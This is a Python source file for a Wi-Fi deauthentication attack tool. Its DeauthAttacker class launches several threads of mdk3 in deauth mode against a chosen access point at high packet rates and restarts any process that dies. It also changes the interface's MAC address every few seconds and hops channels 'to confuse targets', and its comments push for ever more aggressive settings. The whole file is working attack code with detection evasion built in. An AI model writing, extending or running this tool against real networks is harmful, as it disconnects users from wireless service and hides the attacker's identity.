import subprocess
import threading
import time
import signal
import os
import select
import random
import re
from typing import Optional, Dict, List
from rich.console import Console

from src.logger import get_logger
from src.utils import run_command

console = Console()
logger = get_logger(__name__)

class DeauthAttacker:
    """Perform deauthentication attacks"""
    
    def __init__(self, interface: str, config: Dict):
        self.interface = interface
        self.config = config
        self.processes: List[subprocess.Popen] = []
        self.running = False
        self.packets_sent = 0
        self.attack_threads: List[threading.Thread] = []
        self.target_bssid = None
        self.channel = None
        self.packet_rate = 1000
        self.process_restart_delay = 2
        self.stop_event = threading.Event()
        self.process_lock = threading.Lock()
        self.original_mac = None
        
    def start_attack(self, target_bssid: str, channel: int, packet_rate: int = 1000):
        """Start deauth attack on target"""
        self.target_bssid = target_bssid
        self.channel = channel
        self.packet_rate = packet_rate
        self.running = True
        self.stop_event.clear()
        
        # Save original MAC for cleanup
        self.original_mac = self.get_current_mac()
        
        self.set_channel(channel)
        
        console.print(f"[yellow]Starting attack on {target_bssid} (Channel {channel})[/yellow]")
        console.print(f"[dim]Packet rate: {packet_rate} packets/sec[/dim]")
        console.print(f"[dim]MAC Spoofing: ENABLED (every 5-10 seconds)[/dim]")
        console.print(f"[dim]Channel Hopping: ENABLED[/dim]")
        
        # Calculate number of threads based on packet rate - MORE AGGRESSIVE
        num_threads = max(2, min(6, packet_rate // 200))
        packets_per_thread = packet_rate // num_threads
        
        # Start attack threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._attack_loop,
                args=(target_bssid, channel, packets_per_thread, i),
                daemon=True
            )
            thread.start()
            self.attack_threads.append(thread)
            
        # Start MAC spoofing thread
        mac_thread = threading.Thread(
            target=self._mac_spoof_loop,
            daemon=True
        )
        mac_thread.start()
        self.attack_threads.append(mac_thread)
        
        # Start channel hopping thread
        channel_thread = threading.Thread(
            target=self._channel_hop_loop,
            args=(channel,),
            daemon=True
        )
        channel_thread.start()
        self.attack_threads.append(channel_thread)
            
        logger.info(f"Attack started on {target_bssid} with {num_threads} threads")
        
    def _attack_loop(self, target_bssid: str, channel: int, thread_rate: int, thread_id: int):
        """Attack loop for each thread with proper cleanup - MORE AGGRESSIVE"""
        process = None
        restart_count = 0
        max_restarts = 10
        
        while self.running and not self.stop_event.is_set() and restart_count < max_restarts:
            try:
                # Use mdk3 for deauth with aggressive settings
                cmd = [
                    "sudo", "mdk3",
                    self.interface,
                    "d",  # deauth mode
                    "-c", str(channel)
                ]
                
                if target_bssid:
                    cmd.extend(["-m", target_bssid])
                
                # MUCH MORE AGGRESSIVE packet rate
                if thread_rate > 0:
                    # Convert packets/sec to microseconds delay
                    # Lower delay = higher packet rate
                    if thread_rate >= 2000:
                        delay = max(20, int(1000000 / (thread_rate * 3)))
                    elif thread_rate >= 1000:
                        delay = max(30, int(1000000 / (thread_rate * 2)))
                    else:
                        delay = max(50, int(1000000 / (thread_rate * 2)))
                    cmd.extend(["-s", str(delay)])
                
                # Add deauth reason code (7 works best)
                cmd.extend(["-r", "7"])
                
                logger.debug(f"Thread {thread_id} starting mdk3 with command: {' '.join(cmd)}")
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    start_new_session=True
                )
                
                with self.process_lock:
                    self.processes.append(process)
                
                # More aggressive packet counting
                packets_per_loop = max(thread_rate // 5, 100)
                
                while self.running and not self.stop_event.is_set():
                    if process.poll() is not None:
                        logger.warning(f"Thread {thread_id} mdk3 died (exit code: {process.returncode})")
                        break
                    
                    self.packets_sent += packets_per_loop
                    time.sleep(0.05)  # Faster loop = more packets
                
                if process.poll() is not None and self.running and not self.stop_event.is_set():
                    restart_count += 1
                    logger.warning(f"Thread {thread_id} restarting (attempt {restart_count}/{max_restarts})")
                    time.sleep(self.process_restart_delay)
                    continue
                else:
                    break
                    
            except Exception as e:
                logger.error(f"Thread {thread_id} error: {e}")
                restart_count += 1
                if self.running and not self.stop_event.is_set() and restart_count < max_restarts:
                    time.sleep(self.process_restart_delay)
                    continue
                else:
                    break
        
        with self.process_lock:
            if process in self.processes:
                self.processes.remove(process)
        
        logger.debug(f"Thread {thread_id} exiting")
    
    def _mac_spoof_loop(self):
        """Spoof MAC address every few seconds"""
        while self.running and not self.stop_event.is_set():
            try:
                # Wait 5-10 seconds between MAC changes
                time.sleep(random.randint(5, 10))
                
                if not self.running or self.stop_event.is_set():
                    break
                
                # Generate random MAC
                new_mac = self._generate_random_mac()
                
                # Bring interface down
                subprocess.run(
                    ["sudo", "ip", "link", "set", self.interface, "down"],
                    capture_output=True,
                    timeout=2
                )
                
                # Change MAC
                subprocess.run(
                    ["sudo", "macchanger", "-m", new_mac, self.interface],
                    capture_output=True,
                    timeout=3
                )
                
                # Bring interface up
                subprocess.run(
                    ["sudo", "ip", "link", "set", self.interface, "up"],
                    capture_output=True,
                    timeout=2
                )
                
                # Re-set channel after MAC change
                if self.channel:
                    self.set_channel(self.channel)
                
                logger.info(f"MAC spoofed to {new_mac}")
                console.print(f"[dim]🔄 MAC changed to {new_mac}[/dim]")
                
            except Exception as e:
                logger.error(f"MAC spoof error: {e}")
                continue
    
    def _channel_hop_loop(self, base_channel: int):
        """Hop between channels to confuse targets"""
        # Common WiFi channels
        channels_2ghz = [1, 6, 11]
        channels_5ghz = [36, 40, 44, 48, 149, 153, 157, 161]
        all_channels = channels_2ghz + channels_5ghz
        
        # If base channel is 5GHz, use 5GHz channels
        if base_channel > 14:
            hop_channels = channels_5ghz
        else:
            hop_channels = channels_2ghz
        
        # If base channel is 1,6,11, prioritize those
        if base_channel in hop_channels:
            # Put base channel in the list multiple times to stay on it more
            hop_channels = [base_channel] * 3 + hop_channels
        
        while self.running and not self.stop_event.is_set():
            try:
                # Wait 2-5 seconds between hops
                time.sleep(random.randint(2, 5))
                
                if not self.running or self.stop_event.is_set():
                    break
                
                # Pick a random channel
                new_channel = random.choice(hop_channels)
                
                # Set the channel
                self.set_channel(new_channel)
                
                logger.info(f"Channel hopped to {new_channel}")
                console.print(f"[dim]📡 Channel changed to {new_channel}[/dim]")
                
            except Exception as e:
                logger.error(f"Channel hop error: {e}")
                continue
    
    def _generate_random_mac(self) -> str:
        """Generate a random MAC address"""
        # Randomize first byte but keep it locally administered
        mac = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00]
        for i in range(1, 6):
            mac[i] = random.randint(0x00, 0xff)
        return ':'.join(f'{x:02x}' for x in mac)
    
    def get_current_mac(self) -> Optional[str]:
        """Get current MAC address"""
        try:
            result = subprocess.run(
                ["cat", f"/sys/class/net/{self.interface}/address"],
                capture_output=True,
                text=True,
                timeout=2
            )
            return result.stdout.strip()
        except:
            return None
        
    def set_channel(self, channel: int):
        """Set interface to specific channel"""
        try:
            methods = [
                ["sudo", "iwconfig", self.interface, "channel", str(channel)],
                ["sudo", "iw", "dev", self.interface, "set", "channel", str(channel)],
            ]
            
            for method in methods:
                try:
                    result = subprocess.run(
                        method,
                        check=False,
                        capture_output=True,
                        timeout=5,
                        text=True
                    )
                    if result.returncode == 0:
                        logger.info(f"Channel set to {channel}")
                        time.sleep(0.5)
                        return True
                except:
                    continue
                    
        except Exception as e:
            logger.error(f"Error setting channel: {e}")
            
    def stop_attack(self):
        """Stop all attacks"""
        console.print("[yellow]Stopping attack...[/yellow]")
        
        self.stop_event.set()
        self.running = False
        
        with self.process_lock:
            for process in self.processes:
                try:
                    process.terminate()
                    try:
                        process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        process.kill()
                except:
                    pass
            self.processes.clear()
        
        for thread in self.attack_threads:
            thread.join(timeout=3)
        self.attack_threads.clear()
        
        # Restore original MAC
        if self.original_mac:
            try:
                subprocess.run(
                    ["sudo", "ip", "link", "set", self.interface, "down"],
                    capture_output=True,
                    timeout=2
                )
                subprocess.run(
                    ["sudo", "macchanger", "-m", self.original_mac, self.interface],
                    capture_output=True,
                    timeout=3
                )
                subprocess.run(
                    ["sudo", "ip", "link", "set", self.interface, "up"],
                    capture_output=True,
                    timeout=2
                )
                logger.info(f"Original MAC restored: {self.original_mac}")
            except:
                pass
        
        try:
            subprocess.run(
                ["sudo", "iwconfig", self.interface, "channel", "auto"],
                check=False,
                timeout=5,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass
            
        logger.info(f"Attack stopped. Total packets sent: {self.packets_sent}")
        console.print(f"[green]✓ Attack stopped. Packets sent: {self.packets_sent:,}[/green]")
        
    def is_running(self) -> bool:
        """Check if attack is running"""
        if not self.running or self.stop_event.is_set():
            return False
            
        with self.process_lock:
            self.processes = [p for p in self.processes if p.poll() is None]
            return len(self.processes) > 0
        
    def get_status(self) -> Dict:
        """Get attack status"""
        with self.process_lock:
            active_processes = sum(1 for p in self.processes if p.poll() is None)
        return {
            'running': self.is_running(),
            'packets_sent': self.packets_sent,
            'processes': active_processes,
            'target': self.target_bssid,
            'channel': self.channel
        }
        
    def get_packet_rate(self) -> int:
        return self.packet_rate
        
    def set_packet_rate(self, rate: int):
        self.packet_rate = rate
        logger.info(f"Packet rate updated to {rate}")
